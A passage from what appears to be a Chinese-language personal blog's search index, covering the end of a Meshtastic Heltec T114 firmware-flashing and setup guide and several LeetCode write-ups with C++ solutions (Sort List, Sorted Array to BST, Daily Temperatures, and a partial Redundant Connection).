線，而不要使用僅有充電功能的傳輸線</p></div><p>每個板子的韌體不一樣，這裡可以透過 Meshtastic Web Flasher 根據板子型號提供不同版本的韌體</p><blockquote><p>Web Flasher: <a href="https://flasher.meshtastic.org/">https://flasher.meshtastic.org/</a></p></blockquote><p>當你插上 T114後，進入Flasher頁面後，首先你需要選擇你的板子，我這裡就選擇 <strong>Heltec Mesh Node T114</strong><br><img src="/img/mesh/flash.png"></p><p>韌體選擇方面，建議選擇穩定版本 (Beta) 中的最新 release，Aplha 版本的韌體大多應該還在開發測試。之後就可以點擊 <strong>Flash</strong><br><img src="/img/mesh/flash-2.png"></p><p>這裡會跳出一個畫面，會要你點選 <strong>Enter DFU mode</strong> 這個行為會讓你的Heltec T114 進入燒寫模式，或者也可以手動連續按兩下 T114 的 RST button，另外在你的本地端電腦也會有新的drive<br><img src="/img/mesh/flash-3.png"></p><p>進入DFU mode 的T114 會像下圖一樣<br><img src="/img/mesh/heltec-2.jpg"></p><p>此時點選 Web Flasher 中的 <strong>Download UF2</strong> 這時候韌體的檔案會被下載到本機的下載(Download) 目錄，此時只需要簡單將韌體檔案直接複製到 Heltec Drive目錄就好，可以用手動拖曳或者是用linux command <code>cp</code> 過去都行，<strong>但是不論哪個平台我嘗試，複製到快到結束時 Drive 會度彈出，然後 Windows&#x2F;Linux 可能會跳錯誤訊息，這時候還不用急著troubleshooting，先去確認韌體是否成功燒錄！</strong></p><p><img src="/img/mesh/heltec-3.jpg"></p><p>此時用 Meshtastic 的app 去連接 heltec t114 結果是成功的，因此韌體其實是有成功燒錄的，只不過可能燒錄結束的handling 沒做好。</p><h1 id="基本設定"><a href="#基本設定" class="headerlink" title="基本設定"></a>基本設定</h1><p>這裡我是選擇下載Android 版本的 <a href="https://meshtastic.org/docs/software/android/installation/">Meshtastic App</a>，後面app的設定基本上是參照這兩份資源：</p><blockquote><p><a href="https://hackmd.io/@BASHCAT/S1m_x-AOA/%2F5Vy7EE6dQL2v_XHPkbSKtw">https://hackmd.io/@BASHCAT/S1m_x-AOA/%2F5Vy7EE6dQL2v_XHPkbSKtw</a><br><a href="https://youtu.be/6hW40yaj3x4?si=-UTeOGxNK6JHDrnQ">https://youtu.be/6hW40yaj3x4?si=-UTeOGxNK6JHDrnQ</a></p></blockquote><p>初次連結藍芽時，會需要在手機上輸入Heltec T114 面板上面顯示的pin碼進行配對，後續就等配對成功就可以透過App遠端設定板子</p><p>剛入坑的朋友應該不用調整太多東西，首先根據國家去設定你的 Region，這裡就設定成「TW」，而臺灣能夠使用的頻率範圍會是 ，可以在最底下頻率指定 配置時選擇區域為 <strong>923.875Mhz</strong></p><p>接著，可以開始去掃描台灣鏈網社群的 QR Code 就可以加入 channel 在社群的 SignalTest 頻道來去測試是否能夠收發訊號。但在那之前，如果訊息都收度不到也發佈出去！先檢查天線跟轉接線，這裡建議不要使用原廠提供的轉接線跟天線，可以自己去買好一點的轉接線跟天線。這裡爬文社群好像幾乎都推使用 TX915 天線，這裡也可以參考官網的天線支援列表<br><a href="https://meshtastic.org/zh-TW/docs/hardware/antennas/">https://meshtastic.org/zh-TW/docs/hardware/antennas/</a></p><div class="note info flat"><p>另外如果有測試其他天線，也可以貢獻到這個GitHub Repo: <a href="https://github.com/meshtastic/antenna-reports">https://github.com/meshtastic/antenna-reports</a></p></div><p>轉接線的部分可以去今華電子購買: <strong><a href="https://jin-hua.com.tw/page/product/show.aspx?num=31134&lang=TW">IPEX-SMA 母頭母針連接線</a></strong></p><blockquote><p>下一篇會詳細講 App 設定 !!</p></blockquote><p>一旦設定完成就可以像這樣在channel發送訊息</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Meshtastic App 截圖 </summary><div class="toggle-content"><p><img src="/img/mesh/heltec-6.jpg"><br><img src="/img/mesh/heltec-7.jpg"></p></div></details>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Meshtastic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鏈結串列排序 | Medium | LeetCode#148. Sort List</title>
      <link href="/posts/9c4eaa61.html"/>
      <url>/posts/9c4eaa61.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/148/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述：給定一個 Linked List 的 <code>head</code> 請將這個 list 進行升階排序 (由小排到大)</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始有想到比較蠢的方法，就是把先在的節點對應到記憶體位址可能存到一個hasht table 之類的，然後把key額外存成陣列進行排序後再建立另一個 linked list。 但後來想要用題目的 follow up條件來做看看，也就是時間複雜度要 $O(nlogn)$ 然後空間複雜度要 $O(1)$</p><p>但這空間複雜度 $O(1)$ 基本上就代表只能在原本的 list 上進行操作，然後時間複雜度 $O(nlogn)$ 就代表應該是要用 quick sort 或者 merge sort 之類的方式來對 linked list中的節點進行排序。</p><p>我原先想說可以用 quick sort 但 <strong>quick sort 比較適合對 Array 做排序，原因一：Linked Listed 不能夠 random access，存取第 n 個元素就真的要從頭走到第 n 個節點。第二個原因就是做partition 很困難，因為每次切完partition後還需要將比pivot 大或比pivot小的節點移動到pivot節點的兩側，會需要瘋狂動 <code>next</code> pointer</strong>，另外 quick sort pivot 沒選好最糟糕時間複雜度會是 $O(n^2)$</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">findMiddle</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!head || !head-&gt;next) <span class="keyword">return</span> head;</span><br><span class="line">        ListNode* slow = head;</span><br><span class="line">        ListNode* fast = head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span> (fast &amp;&amp; fast-&gt;next) &#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">ListNode* <span class="title">merge</span><span class="params">(ListNode* l1, ListNode* l2)</span></span>&#123;</span><br><span class="line">        ListNode dummy;</span><br><span class="line">        ListNode *tail = &amp;dummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(l1 &amp;&amp; l2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123;</span><br><span class="line">                tail-&gt;next = l1;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                tail-&gt;next = l2;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            tail = tail-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l1)&#123;</span><br><span class="line">            tail-&gt;next= l1;</span><br><span class="line">            l1=l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tail-&gt;next = l2;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">ListNode* <span class="title">sortList</span><span class="params">(ListNode* head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head || !head-&gt;next) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        ListNode *mid = <span class="built_in">findMiddle</span>(head);</span><br><span class="line">        ListNode *right= mid-&gt;next;</span><br><span class="line">        mid-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        ListNode *left_sorted = <span class="built_in">sortList</span>(head);</span><br><span class="line">        ListNode *right_sorted = <span class="built_in">sortList</span>(right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">merge</span>(left_sorted, right_sorted);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>對linked list 做merged sort，大方向上就是三個步驟：</p><ul><li>找中點 → 切兩半</li><li>左右各自排序</li><li>合併兩條已排序 linked list</li></ul><p>這裡也有用到 Divide and Conquer 的概念，這邊會遞迴去做直到遇到 base case: 也就是只有一個節點時，就不能夠再找中點去切兩半，就時候就會回到上一個caller去排序然後合併，開始一路 return 回去最初的 caller。</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step1 找中點並切一半 </summary><div class="toggle-content"><p><img src="/img/LeetCode/148/algo-1.png"></p></div></details><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step2-3 左右各自排序然後合併 </summary><div class="toggle-content"><p>(可以點圖片放大看)<br><img src="/img/LeetCode/148/algo-2.png"><br>但這裡描述的會是兩鏈已經透過 <code>sortList</code>函數排序完，並且正要透過 <code>merge</code> 合併的狀況</p></div></details><p>首先串列會先被丟到 <code>findMiddle</code> 函數透過 fast-slow pointer 去找中點，然後直接將中點pointer的 <code>next</code> 接到 <code>nullptr</code> 這樣就能拆成兩個list接著會需要各自排序，但排序的原則是要做到只有一個node才能排序，因此遞迴執行下去一樣需要對各自串列找中點切一半，然後 <strong>合併</strong> 。 合併的部分就需要透過 <code>merge</code> 函數去做。這邊會先宣告一個 dummy node 方便之後回傳list的head，而另一個 <code>tail</code> pointer 會先指到 <code>dummy</code>。</p><p><code>merge</code> 的精髓就是當兩條鏈都還有節點時，就會去進行比大小，比較小的節點會先接到 dummy 的後面，例如 <code>l1</code>  當前節點值比 <code>l2</code>當前節點值小，那 <code>l1</code> 就會接到 dummy 後面，此時 <code>l1</code> 會更新自己的 head 到下一個節點，反之 <code>l2</code>如果比較大，那 <code>l2</code> 當前節點會接到 dummy 後面，然後 <code>l2</code> 的head 更新到自己的下一個節點。每次比較完畢後， <code>tail</code> 更新到最新節點，下一個要被新增的節點就從這開始繼續。一旦兩鏈比較完後，如果還有list節點有剩，則後面整條接到重新串的節點後面。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/148/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度：</p><ul><li>第一層： $O(n)$ merge</li><li>第二層：兩段各 $n&#x2F;2$ → $O(n)$</li><li>第三層：四段各 $n&#x2F;4$ → $O(n)$<br>一共會有 $log_{2}^{n}$ 層，而每一層在找中點花費 $O(n)$, 進行 merge 也花費 $O(n)$，因此整體複雜度 $O(n) \times log{n} &#x3D; O(nlogn)$</li></ul><p>空間複雜度：<br>不需要額外array 只有多一個dummy node，因此為 $O(1)$ 但 recursive callstack 會是等同於層數，所以是 $O(log{n})$ 因此整體會是 $O(logn)$</p><blockquote><p>結果還是沒有達成空間複雜度 $O(1)$</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Divide and Conqeur </tag>
            
            <tag> Linked List </tag>
            
            <tag> Merged Sort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序陣列轉換成 BST | Easy | LeetCode#108. Convert Sorted Array to Binary Search Tree</title>
      <link href="/posts/9f0b74f6.html"/>
      <url>/posts/9f0b74f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/108/question.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述:  給定一個已排序的陣列 <code>nums</code> (升階排序)，請將其轉換為 <strong>height-balanced BST</strong></li></ul><div class="note info flat"><p>Height-based BST: 其實就是左右子樹高度差距小於等於 1 。<br><a href="https://www.digitalocean.com/community/tutorials/height-of-a-binary-tree-in-c-plus-plus">參考連結</a></p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>太久沒刷題，回來從 Easy 開始刷，這也是第一次刷 <strong>Divide and Conquer</strong> 類別的題目，但這個概念很常用到，一開始以為跟 Quick Sort 很像，就是選pivot 比它大就放在右子樹，比它小就放到左子樹，但後來發現這想法有問題，因為 Quick Sort 會是要去做排序，這裡則是建構子樹。</p><p>回憶BST的特性，對於任意root，左子樹小於 root ，而root小於右子樹， <strong>因此這題的重點會是要怎麼選擇 ROOT 這樣依序遞迴建構才會是 height-balanced BST</strong> 這常來說就會是要往中間找，建立出的 BST才會相對平衡。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">helper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;nums, <span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left &gt; right) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid = left + (right - left)/<span class="number">2</span>;</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(nums[mid]);</span><br><span class="line">        root-&gt;left = <span class="built_in">helper</span>(nums,left, mid<span class="number">-1</span>);</span><br><span class="line">        root-&gt;right = <span class="built_in">helper</span>(nums,mid+<span class="number">1</span>, right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">sortedArrayToBST</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(nums, <span class="number">0</span>, nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>看到 <strong>「已排序陣列」</strong> 然後  <strong>「查找特定元素」</strong> 就會想到 <strong>Binary Search</strong> ! 因此我們找 Root 方式會是以 Binary Search 方式來以中間節點當成 Root，大於中間節點的會在右子樹，小於中間節點的會在左子樹。</p><p>這裡透過 <code>helper</code> 函式做為主要遞迴的主體，每次遞迴都會根據當前陣列範圍，去找出中間 <code>nums[mid]</code> 作為 ROOT 去切分左右子樹，而對於左右子樹分別給予不同的左右區間 (<code>left</code>, <code>right</code>) 一旦 <code>left &gt; right</code> 則代表BST樹建立完畢</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/108/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(n)$: 每個節點還是會走訪一次 </p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(n)$: 樹高會是 $O(LogN)$ 但整個數一樣會需要建立 n 個節點，因此一樣還會是 $O(n)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Search Tree </tag>
            
            <tag> Divide and Conqeur </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每日溫度 | Medium | LeetCode#739. Daily Temperatures</title>
      <link href="/posts/6dcce06b.html"/>
      <url>/posts/6dcce06b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/739/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定一個整數陣列 <code>temperatures</code> 代表每天的氣溫，請回傳一個陣列 <code>answer</code>，<code>answer[i]</code> 代表你必須再等 <code>i-th</code> 天才能夠獲得一個更溫暖的天氣，如果接下來幾天的天氣不可能變更溫暖，則 <code>answer[i] == 0</code>。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我一開始的想法會是，如果隔天溫度比今天溫度低，則將氣溫丟入 Stack 中，但是這樣會有問題，你要額外紀錄當初第一個push進入 stack 的 Index 這樣再回傳陣列的時候才能夠知道從哪個 index 會隔多少天才能夠溫度提升。</p><p>這樣不如直接用 Stack 紀錄 index 本身。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dailyTemperatures</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; temperatures)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(temperatures.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">returnVec</span><span class="params">(temperatures.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="comment">//Store vector index</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; tempStack;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;temperatures.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!tempStack.<span class="built_in">empty</span>() &amp;&amp; temperatures[i] &gt; temperatures[tempStack.<span class="built_in">top</span>()])&#123;</span><br><span class="line">                <span class="type">int</span> prevIndex = tempStack.<span class="built_in">top</span>();</span><br><span class="line">                tempStack.<span class="built_in">pop</span>();</span><br><span class="line">                returnVec[prevIndex] = i - prevIndex;</span><br><span class="line">            &#125;</span><br><span class="line">            tempStack.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> returnVec;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>dailyTemperatures</code> 當中首先紀錄了當 <code>temperature</code> 只有一天溫度的狀況，這樣直接回傳 <code>&#123;0&#125;</code>， 接著宣告回傳陣列 <code>returnVec</code> 其長度為天數，等同於 <code>temperature.size()</code> 並且需要初始化為0。</p><p>接著宣告整數 Stack 為 <code>tempStack</code> 用來存放代表第幾天的 index。接著需要去迭代不同日期的溫度，在每一天當中，如果 stack 不為空，並且當日溫度比起 stack 中存放的之前的溫度還要高，則代表先前溫度的日期 <code>prevIndex</code> 與當前日期相差 <code>i - prevIndex</code> 天數。 如此迭代每一天的溫度，即可獲得正確的 <code>returnVec</code></p><blockquote><p>這種Stack 的用法相對於我原先的想法就方便多了，因為不需額外的資料結構來儲存溫度對應的index值。</p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/739/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(n)$</p><ul><li>每個元素最多 被 push 一次 到 stack 中</li><li>每個元素最多被 Pop 一次</li><li>Push 跟 Pop 的總數不會超過 n<br>空間複雜度: $O(n)$</li><li><code>returnVec</code> 長度為 n 的輸出陣列</li><li><code>tempStack</code>   最壞狀況下可能需要放 n 個 index</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冗餘的連線 | Medium | LeetCode#684. Redundant Connection</title>
      <link href="/posts/1025b1fe.html"/>
      <url>/posts/1025b1fe.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/684/question.jpeg"><br><img src="/img/LeetCode/684/question2.jpeg"></p><ul><li>題目難度: <code>medium</code></li><li>題目敘述: 在這個問題中，Tree是一個無向圖，它是Connected的且沒有環。給定一個圖，它最初是一棵包含 <code>n</code> 個節點（標記為 <code>1</code> 到 <code>n</code>）的樹，但後來新增了一條額外的邊。這條新增的邊連接了從 <code>1</code> 到 <code>n</code> 中選擇的兩個不同的節點，且這條邊之前並不存在於樹中。這個圖由一個長度為 <code>n</code> 的陣列 <code>edges</code> 表示，其中 <code>edges[i] = [a_i, b_i]</code> 表示在圖中節點 <code>a_i</code> 和 <code>b_i</code> 之間存在一條邊。題目要求 <strong>返回一條可以被移除的邊，使得剩下的圖仍然是一棵包含 n 個節點的樹。</strong> 如果有多個答案，請返回輸入中 <strong>最後出現的那條邊。</strong></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法想說，只要按照原先找 Connected Components 的思路，在 Adjacency List 找鄰居的時候，如果找回到已經造訪過的點，那就會是有迴圈，則該edge 是可被移除的。</p><blockquote><p>這樣的想法沒錯，但實際執行時卻會碰到 DFS 遍歷順序的問題，例如測資 <code>[[1,2],[1,3],[2,3]]</code>，當加入 <code>edges[2] = &#123;2,3&#125;</code> 時，會形成一個環（cycle），迭代時會按照鄰接陣列內部存儲順序遍歷當前節點的鄰居，因此有可能會順序不對，給出的邊不一定最後加入的，因為遇到的節點可能只是比較早造訪過。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">2---3</span><br></pre></td></tr></table></figure><p>因此想法改成:</p><div class="note info flat"><ul><li>逐步將邊加入圖，並在每次加入時檢查是否會形成環</li><li>如果新加入的邊形成環，則該邊是冗餘的邊，應該被移除</li><li>如何檢測環？<ul><li>使用 DFS 來檢查是否新加入的邊導致環</li><li>若 DFS 訪問到 已訪問過的節點，則代表形成環</li></ul></li></ul></div><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(vector&lt;<span class="type">bool</span>&gt; &amp;visited, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;adjList, <span class="type">int</span> prevNode, <span class="type">int</span> node)</span></span>&#123;</span><br><span class="line">        visited[node] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> neighbor: adjList[node])&#123;</span><br><span class="line">            <span class="keyword">if</span>(neighbor == prevNode) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(visited[neighbor] || <span class="built_in">dfs</span>(visited, adjList, node, neighbor))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findRedundantConnection</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = edges.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; adjList;</span><br><span class="line">        adjList.<span class="built_in">resize</span>(n+<span class="number">1</span>);</span><br><span class="line">        